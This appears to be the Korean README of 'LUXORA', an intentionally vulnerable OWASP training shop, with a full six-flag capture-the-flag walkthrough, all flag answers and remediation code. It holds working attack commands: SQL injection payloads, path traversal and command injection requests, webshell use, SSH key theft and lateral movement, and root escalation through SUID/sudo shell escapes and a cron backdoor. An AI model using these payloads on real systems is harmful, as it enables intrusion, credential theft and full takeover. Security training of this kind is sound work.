# LUXORA - OWASP CTF 취약점 실습 환경

> ⚠️ **경고**: 이 애플리케이션은 보안 교육 및 CTF(CTF, Capture The Flag) 목적으로 의도적으로 취약점을 포함하고 있습니다. 실제 운영 환경에 배포하거나 인터넷에 노출하지 마세요!

## 목차
- [개요](#개요)
- [환경 설정](#환경-설정)
- [CTF 시나리오](#ctf-시나리오)
  - [Flag 1: 정보 수집 및 숨겨진 엔드포인트 발견](#flag-1-정보-수집-및-숨겨진-엔드포인트-발견)
  - [Flag 2: SQL Injection](#flag-2-sql-injection)
  - [Flag 3: 디렉토리 열거 및 민감 정보 탈취](#flag-3-디렉토리-열거-및-민감-정보-탈취)
  - [Flag 4: RCE 및 파일 읽기](#flag-4-rce-및-파일-읽기)
  - [Flag 5: 횡적 이동 (Lateral Movement)](#flag-5-횡적-이동-lateral-movement)
  - [Flag 6: 권한 상승 (Privilege Escalation)](#flag-6-권한-상승-privilege-escalation)
- [전체 취약점 목록](#전체-취약점-목록)
- [해결 방법](#해결-방법)

---

## 개요

LUXORA는 겉으로는 프리미엄 라이프스타일 쇼핑몰처럼 보이지만, 내부적으로 다양한 OWASP Top 10 취약점을 포함하고 있는 CTF 플랫폼입니다.

### 기술 스택
- **Frontend**: EJS 템플릿 엔진
- **Backend**: Node.js + Express
- **Database**: PostgreSQL
- **Infrastructure**: Docker Compose

---

## 환경 설정

```bash
# 저장소 클론
git clone https://github.com/agnusdei1207/OWASP.git
cd OWASP

# Docker 컨테이너 실행
docker-compose up -d

# 데이터베이스 초기화
docker-compose exec postgres psql -U vulnuser -d vulndb -f /docker-entrypoint-initdb.d/init.sql

# 애플리케이션 접속
open http://localhost:3000
```

---

## CTF 시나리오

### Flag 1: 정보 수집 및 숨겨진 엔드포인트 발견

**난이도**: 🟢 Easy
**카테고리**: Information Gathering, Reconnaissance

#### 목표
숨겨진 엔드포인트와 개발자 힌트를 발견하여 첫 번째 플래그를 획득하세요.

#### 힌트
1. 웹 사이트의 `robots.txt` 확인
2. `sitemap.xml` 분석
3. `.well-known/security.txt` 확인
4. 페이지 소스 코드 검사
5. 숨겨진 개발자 노트 페이지 찾기

#### 공격 시나리오

**Step 1: robots.txt 확인**
```
http://localhost:3000/robots.txt
```
다음과 같은 내용을 발견:
```
Disallow: /admin/
Disallow: /dev-notes/
Disallow: /secrets/
Disallow: /flags/
```

**Step 2: sitemap.xml 분석**
```
http://localhost:3000/sitemap.xml
```
개발자가 실수로 남긴 내부 URL 발견:
```xml
<!-- TODO: Remove internal URLs before production! -->
<url><loc>https://luxora.com/dev-notes</loc></url>
```

**Step 3: 개발자 노트 접속**
```
http://localhost:3000/dev-notes
```

**Step 4: /dev-notes 페이지에서 힌트 확인**
- Slack 채팅 기록에서 내부 비밀번호 확인
- 이메일에서 침투 테스트 결과 확인
- 숨겨진 디렉토리 경로 발견

**Step 5: 첫 번째 플래그 획득**
```
http://localhost:3000/flags/flag1.txt
```

#### 🏆 Flag
```
FLAG{w3lc0me_t0_lux0r4_ctf}
```

---

### Flag 2: SQL Injection

**난이도**: 🟡 Medium
**카테고리**: A03:2021 - Injection

#### 목표
SQL Injection 취약점을 이용하여 데이터베이스에서 플래그가 포함된 사용자 정보를 탈취하세요.

#### 취약점 위치
- `/login` (POST)
- `/search` (GET)
- `/track-order` (GET)
- `/users?name=` (GET)

#### 공격 시나리오

**Step 1: SQL Injection 포인트 발견**

로그인 페이지에서 오류 메시지 분석:
```bash
curl -X POST http://localhost:3000/login \
  -d "username=admin'--&password=anything"
```

**Step 2: UNION 기반 SQL Injection**

검색 기능 이용:
```bash
# 컬럼 수 확인
http://localhost:3000/search?q=' UNION SELECT 1,2,3,4,5,6--

# 데이터베이스 정보 확인
http://localhost:3000/search?q=' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables--

# 사용자 테이블 확인
http://localhost:3000/search?q=' UNION SELECT id,username,password,email,ssn,api_key FROM users--
```

**Step 3: 플래그 획득**

`ctf_flag_holder` 사용자의 api_key 컬럼 확인:
```bash
http://localhost:3000/search?q=' UNION SELECT id,username,password,email,api_key,6 FROM users WHERE username='ctf_flag_holder'--
```

또는 로그인 우회:
```bash
curl -X POST http://localhost:3000/login \
  -d "username=ctf_flag_handler'--&password=x"
```

#### 🏆 Flag
```
FLAG{sql_1nj3ct10n_m4st3r}
```

#### 방어 방법
- Parameterized Query 사용
- Input Validation 구현
- ORM 사용
- 최소 권한 데이터베이스 계정 사용

---

### Flag 3: 디렉토리 열거 및 민감 정보 탈취

**난이도**: 🟡 Medium
**카테고리**: A01:2021 - Broken Access Control, Information Disclosure

#### 목표
숨겨진 디렉토리와 파일을 발견하여 민감한 정보를 탈취하세요.

#### 힌트
- `/secrets/` 디렉토리
- `/.hidden/` 디렉토리
- `/backup/` 엔드포인트
- Path Traversal 취약점

#### 공격 시나리오

**Step 1: 디렉토리 스캔**
```bash
gobuster dir -u http://localhost:3000 -w /path/to/wordlist.txt
```

발견된 경로:
- `/secrets/`
- `/.hidden/`
- `/backup`
- `/api-docs`

**Step 2: Backup 엔드포인트 확인**
```bash
curl http://localhost:3000/backup
```
```json
{
  "files": [
    {"name": "ssh_keys_backup.tar.gz", "size": "2KB"},
    {"name": "config_backup.tar.gz", "size": "5KB"}
  ],
  "hint": "Download via /download?file=../backup/filename"
}
```

**Step 3: Path Traversal 이용**
```bash
curl "http://localhost:3000/download?file=../secrets/ssh_keys.md"
curl "http://localhost:3000/files?dir=../secrets"
```

**Step 4: /secrets 디렉토리 탐색**
```bash
curl "http://localhost:3000/files?dir=/app/secrets"
```

발견 파일:
- `database.txt` - 데이터베이스 인증 정보
- `api_keys.txt` - API 키
- `ssh_keys.md` - SSH 개인 키 (mike 계정)

**Step 5: 플래그 획득**
```bash
curl "http://localhost:3000/flags/flag3.txt"
# 또는
curl "http://localhost:3000/download?file=../flags/flag3.txt"
```

#### 🏆 Flag
```
FLAG{s3cr3ts_d1r3ct0ry_f0und}
```

---

### Flag 4: RCE 및 파일 읽기

**난이도**: 🔴 Hard
**카테고리**: A03:2021 - Injection (Command Injection), File Upload

#### 목표
원격 코드 실행(RCE) 취약점을 이용하여 서버에서 플래그를 읽어내세요.

#### 취약점 위치
- `/cmd?exec=` - 직접 명령 실행
- `/webshell` (POST) - 웹쉘
- `/ping?host=` - Command Injection
- `/upload` - 악성 파일 업로드
- `/image?url=` - SSRF
- `/download?file=` - Path Traversal

#### 공격 시나리오

**방법 1: /cmd 엔드포인트 직접 이용**
```bash
curl "http://localhost:3000/cmd?exec=cat%20/app/flags/flag4.txt"
```

**방법 2: 웹쉘 이용**
```bash
curl -X POST http://localhost:3000/webshell \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /app/flags/flag4.txt"}'
```

**방법 3: Command Injection (Ping)**
```bash
curl "http://localhost:3000/ping?host=127.0.0.1;cat%20/app/flags/flag4.txt"
```

**방법 4: 파일 업로드 + 웹쉘**
```bash
# 웹쉘 업로드
curl -X POST http://localhost:3000/upload \
  -F "file=@shell.php"

# 업로드된 파일 확인 후 실행
curl "http://localhost:3000/uploads/<uploaded_filename>?cmd=cat%20/app/flags/flag4.txt"
```

**방법 5: Path Traversal로 직접 읽기**
```bash
curl "http://localhost:3000/download?file=../../app/flags/flag4.txt"
curl "http://localhost:3000/read-file?file=../../app/flags/flag4.txt"
```

#### 🏆 Flag
```
FLAG{rc3_4nd_f1l3_r34d_4ch13v3d}
```

#### 다음 단계 힌트
```
Next targets:
- Read /home/sarah/.ssh/id_rsa for lateral movement
- Check /etc/passwd for other users
- Look for SUID binaries: find / -perm -4000 2>/dev/null
```

---

### Flag 5: 횡적 이동 (Lateral Movement)

**난이도**: 🔴 Hard
**카테고리**: Lateral Movement, SSH Key Theft

#### 목표
RCE를 통해 SSH 개인 키를 탈취하고 다른 사용자 계정으로 이동하세요.

#### 공격 시나리오

**Step 1: SSH 키 위치 확인**

dev-notes 페이지에서 확인한 정보:
- `/home/mike/.ssh/id_rsa`
- `/app/secrets/ssh_keys.md`

**Step 2: SSH 키 탈취**
```bash
# 웹쉘을 통한 키 탈취
curl -X POST http://localhost:3000/webshell \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /app/secrets/ssh_keys.md"}'
```

또는:
```bash
curl "http://localhost:3000/cmd?exec=cat%20/app/secrets/ssh_keys.md"
```

**Step 3: SSH 키 분석**
```
-----BEGIN OPENSSH PRIVATE KEY-----
...
Username: mike
Server: 10.10.10.50
Password: mike2024!
...
-----END OPENSSH PRIVATE KEY-----
```

**Step 4: SSH 접속**
```bash
# 키 파일 생성
echo "-----BEGIN OPENSSH PRIVATE KEY-----..." > mike_key
chmod 600 mike_key

# SSH 접속
ssh -i mike_key mike@10.10.10.50
# 또는 비밀번호로
ssh mike@10.10.10.50
# Password: mike2024!
```

**Step 5: Sarah 계정으로 횡적 이동**
```bash
# mike 계정에서
cat /home/sarah/.ssh/id_rsa
# 또는
sudo -u sarah bash
```

**Step 6: 플래그 획득**
```bash
curl "http://localhost:3000/flags/flag5.txt"
# 또는 서버 내부에서
cat /app/flags/flag5.txt
```

#### 🏆 Flag
```
FLAG{l4t3r4l_m0v3m3nt_m4st3r}
```

#### 다음 단계 힌트
```
Sarah has sudo access. Check what she can run:
$ sudo -l

Possible privilege escalation vectors:
- SUID binaries
- Writable cron scripts
- Kernel exploits
- Misconfigured sudo
```

---

### Flag 6: 권한 상승 (Privilege Escalation)

**난이도**: 🔴 Hard
**카테고리**: Privilege Escalation, Linux Security

#### 목표
일반 사용자에서 root 권한으로 상승하여 최종 플래그를 획득하세요.

#### 공격 시나리오

**Step 1: 시스템 정보 수집**
```bash
# SUID 바이너리 확인
find / -perm -4000 2>/dev/null

# sudo 권한 확인
sudo -l

# 커널 버전 확인
uname -a

# 쓰기 가능한 cron 스크립트 확인
ls -la /etc/cron*
```

**Step 2: 권한 상승 벡터 분석**

**방법 1: SUID 바이너리 악용**
```bash
# vim/nvim이 SUID인 경우
vim -c ':!/bin/sh'

# find가 SUID인 경우
find / -exec /bin/sh \;

# nmap이 SUID인 경우
nmap --interactive
!sh
```

**방법 2: Sudo 권한 악용**
```bash
# sarah의 sudo 권한 확인
sudo -l
# (root) NOPASSWD: /usr/bin/vim

sudo vim -c ':!/bin/sh'
```

**방법 3: Cron 스크립트 변조**
```bash
# 쓰기 가능한 cron 스크립트 확인
ls -la /etc/cron.d/

# 백도어 추가
echo "* * * * * root chmod +s /bin/bash" >> /etc/cron.d/backup

# 기다린 후
/bin/bash -p
```

**방법 4: 커널 익스플로잇**
```bash
# Dirty Cow 등 커널 취약점 이용
# (실제 환경에서는 최신 커널로 업데이트하여 방어)
```

**Step 3: Root 획득**
```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
```

**Step 4: 최종 플래그 획득**
```bash
cat /app/flags/root.txt
# 또는
cat /root/root.txt
```

#### 🏆 Flag
```
FLAG{r00t_4cc3ss_4ch13v3d_y0u_4r3_4_h4ck3r}
```

---

## 전체 취약점 목록

### OWASP Top 10 (2021)

| 카테고리 | 취약점 | 엔드포인트 |
|---------|--------|-----------|
| A01:2021 - Broken Access Control | IDOR | `/profile/:id` |
| A01:2021 - Broken Access Control | 쿠키 조작 | `/admin` |
| A02:2021 - Cryptographic Failures | 평문 비밀번호 | `/register` |
| A02:2021 - Cryptographic Failures | 약한 암호화 | `/encrypt` |
| A03:2021 - Injection | SQL Injection | `/login`, `/search`, `/users` |
| A03:2021 - Injection | Command Injection | `/ping`, `/dns`, `/cmd`, `/webshell` |
| A03:2021 - Injection | NoSQL Injection | `/search` (POST) |
| A03:2021 - Injection | LDAP Injection | `/ldap` |
| A03:2021 - Injection | XPath Injection | `/xpath` |
| A04:2021 - Insecure Design | 예측 가능한 토큰 | `/reset-password` |
| A04:2021 - Insecure Design | 보안 질문 약화 | `/security-questions` |
| A05:2021 - Security Misconfiguration | 설정 노출 | `/config`, `/debug` |
| A05:2021 - Security Misconfiguration | 디렉토리 리스팅 | `/files` |
| A05:2021 - Security Misconfiguration | 스택 트레이스 | `/error` |
| A06:2021 - Vulnerable Components | 프로토타입 오염 | `/merge` |
| A06:2021 - Vulnerable Components | 역직렬화 | `/deserialize` |
| A07:2021 - Auth Failures | 세션 고정 | `/session` |
| A07:2021 - Auth Failures | 무차별 대입 | `/brute` |
| A08:2021 - Integrity Failures | 무결성 검사 없음 | `/download`, `/deploy` |
| A09:2021 - Logging Failures | 로그 인젝션 | `/log` |
| A09:2021 - Logging Failures | 민감 정보 로깅 | `/debug-logs` |
| A10:2021 - SSRF | 웹훅 SSRF | `/webhook`, `/fetch`, `/image` |

### 기타 취약점

| 취약점 | 엔드포인트 |
|--------|-----------|
| Stored XSS | `/comments`, `/products/:id/reviews` |
| Reflected XSS | `/search-xss` |
| DOM XSS | `/dom-xss` |
| Path Traversal | `/download`, `/files`, `/read-file` |
| Open Redirect | `/redirect`, `/login-redirect` |
| File Upload | `/upload` |
| XXE | `/xml` |
| CORS Misconfiguration | `/api/data` |
| JWT Weakness | `/jwt` |
| SSRF | `/image`, `/fetch`, `/proxy`, `/webhook` |
| Reverse Shell | `/shell`, `/reverse-shell`, `/webshell`, `/cmd` |
| Mass Assignment | `/users/:id` (PUT) |
| API Over-permissive | `/api/v1/users` |

---

## 숨겨진 엔드포인트

```
/robots.txt          - 숨겨진 경로 목록
/sitemap.xml         - 내부 URL 유출
/.well-known/security.txt - 보안 연락처 + 힌트
/dev-notes           - 개발자 위키
/api-docs            - API 문서 (취약점 힌트 포함)
/backup              - 백업 파일 목록
/.git/config         - Git 설정 노출
/config              - 환경 설정 노출
/debug               - 시스템 정보 노출
/source              - 소스 코드 노출
/vulns               - 전체 취약점 목록
```

---

## 기본 계정 정보

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| root | toor | admin |
| guest | guest | guest |
| mike | mike2024! | user |
| sarah | sarah2024! | user |

---

## 해결 방법

### 1. SQL Injection 방어
```javascript
// Before (취약)
const query = `SELECT * FROM users WHERE username = '${username}'`;

// After (안전)
const query = 'SELECT * FROM users WHERE username = $1';
const result = await pool.query(query, [username]);
```

### 2. XSS 방어
```javascript
// 입력 검증 + 출력 이스케이프
const escapeHtml = (str) => {
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;');
};
```

### 3. 인증 강화
```javascript
// 세션 기반 인증 사용
const session = require('express-session');
app.use(session({
  secret: process.env.SESSION_SECRET,
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
}));
```

### 4. 입력 검증
```javascript
const { body, validationResult } = require('express-validator');

app.post('/login', [
  body('username').trim().escape(),
  body('password').isLength({ min: 8 })
], (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // ...
});
```

### 5. 파일 업로드 보안
```javascript
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];

app.post('/upload', (req, res) => {
  if (!allowedTypes.includes(req.file.mimetype)) {
    return res.status(400).json({ error: 'Invalid file type' });
  }
  // 무작위 파일명 사용
  const filename = crypto.randomBytes(16).toString('hex');
  // ...
});
```

---

## 플래그 요약

| Flag | 난이도 | 카테고리 | 플래그 값 |
|------|--------|----------|-----------|
| 1 | 🟢 Easy | Reconnaissance | `FLAG{w3lc0me_t0_lux0r4_ctf}` |
| 2 | 🟡 Medium | SQL Injection | `FLAG{sql_1nj3ct10n_m4st3r}` |
| 3 | 🟡 Medium | Directory Enumeration | `FLAG{s3cr3ts_d1r3ct0ry_f0und}` |
| 4 | 🔴 Hard | RCE / File Read | `FLAG{rc3_4nd_f1l3_r34d_4ch13v3d}` |
| 5 | 🔴 Hard | Lateral Movement | `FLAG{l4t3r4l_m0v3m3nt_m4st3r}` |
| 6 | 🔴 Hard | Privilege Escalation | `FLAG{r00t_4cc3ss_4ch13v3d_y0u_4r3_4_h4ck3r}` |

---

## 면책 조항

이 프로젝트는 교육 목적으로만 제작되었습니다. 여기에 포함된 취약점은 실제 운영 환경에서 심각한 보안 위험을 초래할 수 있습니다. 승인되지 않은 시스템에 대한 공격은 불법입니다. 본인의 책임 하에 교육 및 연구 목적으로만 사용하세요.

---

## 라이선스

MIT License - 교육 목적 자유 사용 가능
